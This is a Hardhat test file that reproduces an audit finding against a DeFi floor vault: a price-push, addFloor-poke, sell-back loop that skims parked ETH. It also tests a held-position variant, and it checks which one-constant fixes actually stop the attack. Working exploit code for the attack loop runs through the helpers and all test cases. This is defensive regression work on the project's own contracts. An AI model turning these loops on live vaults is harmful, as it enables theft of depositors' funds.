const { ethers } = require("hardhat");
const { expect } = require("chai");
const { time, takeSnapshot } = require("@nomicfoundation/hardhat-network-helpers");
const { MAX_SQRT_LIMIT, E, f, buildLab, ledger, sizePush } = require("../helpers/h5-lab");

// REGRESSION for ROUND-3 EXTERNAL FINDING H-5 (floor forced-fill), and for the two candidate one-constant
// mitigations. Independently reproduced from scratch — the external auditor never committed their PoCs.
//
// THE ATTACK. On a pad that has dumped below the fixed band, the carve parks. An attacker buys token to shove
// the tick momentarily below `floorTickLower`, pokes `addFloor` (arming `belowSince`), and sells straight back
// — a swap never writes `belowSince`, so he ends token-flat. `MIN_DWELL` later the same push+poke force-commits
// a `MAX_COMMIT_BPS` slice of the carve into the deploy-anchored band at launch-era prices while true spot is
// far below, and the sell-back sweeps that fresh ETH wall. Repeat once per `COMMIT_COOLDOWN`.
//
// WHY THIS IS EXTRACTION, NOT GRIEFING: the identical loop with NO carve present nets NEGATIVE (case 1b).
// Profit exists only when there is a committable carve to skim.
//
// THE TWO CANDIDATE ONE-CONSTANT FIXES — the point of this file:
//   • COMMIT_COOLDOWN > MIN_DWELL       (the external auditor's recommendation) — INERT. Proven below on real
//     contract code: bit-identical attacker PnL, only the wall-clock stretches. Their stated rationale ("forces
//     the attacker to hold a price-risked position across the gap") is false: he is token-flat between commits,
//     so waiting is free. DO NOT SHIP THIS AS A MITIGATION.
//   • COMMIT_COOLDOWN > MAX_OBSERVED_GAP — works ONLY against the token-flat round-trip loop above. Spacing
//     commits beyond the observation gap forces the `nowTs > prevObserved + MAX_OBSERVED_GAP` branch to re-arm
//     `belowSince`, so the stale clock THAT variant rides cannot survive to the next commit.
//
// [R3 N-A] BUT IT IS NOT A CLOSURE, AND CASE 3'S GREEN IS NOT EVIDENCE THAT IT IS. Case 3 hard-codes
// `gapSec: 3901` — a >MAX_OBSERVED_GAP cadence that is attacker-UNFAVOURABLE. The attacker picks the cadence.
// Case 4 below runs the SUSTAINED-HOLD variant: one push, held, poked every 30 min (under the 60 min gap), so
// `lastObserved` never goes stale, `belowSince` never re-arms, and the shipped constant is never consulted.
// Slices commit anyway. Holding costs nothing per unit time on a single-sequencer chain with no arbitrage, so
// "he must hold a price-risked position" is not a cost. Treat case 3 as scoped to ONE variant, never as
// "the floor is fixed" — the structural closure is FLOOR-H5-CLOSURE-SPEC.md.
//
// Both variants are REAL contracts, byte-identical to RobinFloorVault except the one constant
// (contracts/test/H5CooldownVariantVault.sol = 30 min, H5GapCooldownVault.sol = 65 min).

// Drive the attacker's loop: push tick below the band -> poke addFloor -> sell back. Asserts token-flat every
// round (the whole premise of the cost model) and returns the best cumulative PnL over the run.
async function runAttack(L, { rounds, taxBps = 0, gapSec }) {
  const { sw, key, vault, tok, attacker, sqrtAt } = L;
  const led = ledger(attacker.address);
  const start = await ethers.provider.getBalance(attacker.address);
  const carve0 = await ethers.provider.getBalance(await vault.getAddress());
  let best = { r: -1, pnl: -(10n ** 40n), consumed: 0n };
  for (let r = 0; r < rounds; r++) {
    const X = await sizePush(L, 59, taxBps);
    const tb = await tok.balanceOf(attacker.address);
    await led.track(sw.connect(attacker).swap(
      key, { zeroForOne: true, amountSpecified: -X, sqrtPriceLimitX96: await sqrtAt(59) },
      { takeClaims: false, settleUsingBurn: false }, "0x", { value: X }
    ));
    const bought = (await tok.balanceOf(attacker.address)) - tb;
    await led.track(vault.connect(attacker).addFloor());
    await led.track(sw.connect(attacker).swap(
      key, { zeroForOne: false, amountSpecified: -bought, sqrtPriceLimitX96: MAX_SQRT_LIMIT },
      { takeClaims: false, settleUsingBurn: false }, "0x"
    ));
    expect(await tok.balanceOf(attacker.address)).to.equal(tb); // token-flat: he never holds a position
    const pnl = (await ethers.provider.getBalance(attacker.address)) - start + led.gas;
    if (pnl > best.pnl) best = { r, pnl, consumed: carve0 - (await ethers.provider.getBalance(await vault.getAddress())) };
    await time.increase(gapSec);
  }
  return { best, carve0, floorL: await vault.floorLiquidity() };
}

// [R3 N-A] The SUSTAINED-HOLD variant. Unlike runAttack, the attacker is NOT token-flat between commits: he
// pushes the tick below the band ONCE and HOLDS it there, poking on a cadence HE chooses (< MAX_OBSERVED_GAP)
// so the observation clock never goes stale, then unwinds through every wall he minted at the end.
async function runSustainedHold(L, { pokeSec, pokes, taxBps = 0 }) {
  const { sw, key, vault, tok, attacker, sqrtAt } = L;
  const led = ledger(attacker.address);
  const start = await ethers.provider.getBalance(attacker.address);
  const carve0 = await ethers.provider.getBalance(await vault.getAddress());

  const X = await sizePush(L, 59, taxBps);
  const tb = await tok.balanceOf(attacker.address);
  await led.track(sw.connect(attacker).swap(
    key, { zeroForOne: true, amountSpecified: -X, sqrtPriceLimitX96: await sqrtAt(59) },
    { takeClaims: false, settleUsingBurn: false }, "0x", { value: X }
  ));
  const bought = (await tok.balanceOf(attacker.address)) - tb; // HELD, not sold back

  let commits = 0;
  for (let i = 0; i < pokes; i++) {
    await time.increase(pokeSec);
    const before = await vault.floorLiquidity();
    await led.track(vault.connect(attacker).addFloor());
    if ((await vault.floorLiquidity()) > before) commits++;
  }

  await led.track(sw.connect(attacker).swap( // unwind through every freshly-minted ETH wall
    key, { zeroForOne: false, amountSpecified: -bought, sqrtPriceLimitX96: MAX_SQRT_LIMIT },
    { takeClaims: false, settleUsingBurn: false }, "0x"
  ));
  expect(await tok.balanceOf(attacker.address)).to.equal(tb); // flat at the END of the run, not between commits
  return {
    pnl: (await ethers.provider.getBalance(attacker.address)) - start + led.gas,
    consumed: carve0 - (await ethers.provider.getBalance(await vault.getAddress())),
    commits, carve0, floorL: await vault.floorLiquidity(),
  };
}

describe("[R3 H-5] floor forced-fill: the attack, and which one-constant fix actually works", function () {
  this.timeout(3600000);

  const LAB = { baseL: 10n ** 20n, carve: E(20), dumpTick: 12000 }; // dumped ~70%, 20 ETH parked carve

  it("1a. PRE-FIX constants (cooldown 10m == dwell 10m): the attack is profitable and eats the carve", async () => {
    const snap = await takeSnapshot();
    const L = await buildLab({ ...LAB, vaultContract: "H5PreFixVault" }); // the shipped build BEFORE the fix
    const R = await runAttack(L, { rounds: 12, gapSec: 601 });
    console.log(`   pre-fix(dwell 10m == cooldown 10m): best +${f(R.best.pnl)} ETH @r${R.best.r}, carve consumed ${f(R.best.consumed)}/${f(R.carve0)}`);
    expect(R.best.pnl).to.be.gt(0n); // real extraction
    expect(R.best.consumed).to.be.gt(0n); // funded by the carve
    await snap.restore();
  });

  it("1b. CONTROL — same loop with NO carve nets NEGATIVE (extraction, not griefing)", async () => {
    const snap = await takeSnapshot();
    const L = await buildLab({ ...LAB, carve: 0n });
    const R = await runAttack(L, { rounds: 6, gapSec: 601 });
    console.log(`   control (no carve): best ${f(R.best.pnl)} ETH — profit exists ONLY when a carve is present`);
    expect(R.best.pnl).to.be.lt(0n);
    expect(R.floorL).to.equal(0n);
    await snap.restore();
  });

  it("2. the AUDITOR'S recommended fix (COMMIT_COOLDOWN > MIN_DWELL) is INERT — do not ship it", async () => {
    const snap = await takeSnapshot();
    const shipped = await runAttack(await buildLab({ ...LAB, vaultContract: "H5PreFixVault" }), { rounds: 12, gapSec: 601 });
    await snap.restore();

    const snap2 = await takeSnapshot();
    const variant = await runAttack(
      await buildLab({ ...LAB, vaultContract: "H5CooldownVariantVault" }), { rounds: 12, gapSec: 1801 }
    );
    console.log(`   pre-fix 10m: +${f(shipped.best.pnl)}  |  auditor's 30m cooldown: +${f(variant.best.pnl)}  (identical — only the clock stretches)`);
    expect(variant.best.pnl).to.be.gt(0n); // still fully profitable
    // the attacker is token-flat between commits, so a longer wait costs him nothing: PnL is unchanged
    expect(variant.best.pnl).to.equal(shipped.best.pnl);
    await snap2.restore();
  });

  it("3. SHIPPED RobinFloorVault (COMMIT_COOLDOWN > MAX_OBSERVED_GAP) — attacker loses, carve untouched", async () => {
    const snap = await takeSnapshot();
    const L = await buildLab({ ...LAB }); // the REAL shipped vault, now carrying the fix
    expect(await L.vault.COMMIT_COOLDOWN()).to.be.gt(await L.vault.MAX_OBSERVED_GAP()); // the actual fix
    const R = await runAttack(L, { rounds: 12, gapSec: 3901 });
    console.log(`   cooldown 65m > gap 60m: best ${f(R.best.pnl)} ETH, carve consumed ${f(R.best.consumed)}, floorLiquidity ${R.floorL}`);
    expect(R.best.pnl).to.be.lt(0n); // the attacker pays and gets nothing
    expect(R.floorL).to.equal(0n); // nothing was ever force-committed
    expect(R.best.consumed).to.equal(0n); // the carve is untouched
    await snap.restore();
  });

  it("4. [N-A] SUSTAINED HOLD defeats the shipped fix — the attacker chooses the poke cadence", async () => {
    const snap = await takeSnapshot();
    const L = await buildLab({ ...LAB }); // the REAL shipped vault, fix and all
    expect(await L.vault.COMMIT_COOLDOWN()).to.be.gt(await L.vault.MAX_OBSERVED_GAP()); // fix present...
    // ...and irrelevant: poking every 30 min stays inside MAX_OBSERVED_GAP (60 min), so the re-arm branch that
    // case 3 relies on never fires. Case 3 only passes because its 65-min gap is attacker-unfavourable.
    const R = await runSustainedHold(L, { pokeSec: 1800, pokes: 24 }); // 12h of held pressure
    console.log(`   sustained hold: ${f(R.pnl)} ETH, ${R.commits} commits, carve consumed ${f(R.consumed)}/${f(R.carve0)}`);
    expect(R.commits).to.be.gt(0); // slices DO land despite COMMIT_COOLDOWN > MAX_OBSERVED_GAP
    expect(R.consumed).to.be.gt(0n); // the carve is reachable — the shipped fix does not protect it
    expect(R.floorL).to.be.gt(0n); // ETH was force-committed into the stale band
    await snap.restore();
  });
});
